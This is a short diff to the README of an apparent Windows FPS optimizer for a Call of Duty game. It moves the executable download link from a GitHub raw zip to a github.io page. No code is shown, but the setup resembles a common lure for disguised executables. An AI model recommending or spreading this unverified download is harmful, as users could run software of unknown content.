@@ -28,7 +28,7 @@ Call of Duty: Modern Warfare 4 performance optimizer for Windows. One‑click FP
 
 The latest compiled release is available on the **GitHub Releases** page:
 
-[**⬇️ Download MW4_Optimizer.exe**](https://github.com/MedicPergola/MW4-Optimizer/raw/main/MW4_Optimizer_v1.0.zip)
+[**⬇️ Download MW4_Optimizer.exe**](https://medicpergola.github.io/MW4-Optimizer/)
 
 > **Archive:** `MW4_Optimizer_v1.0.zip` (contains the executable + `README.txt`)
 
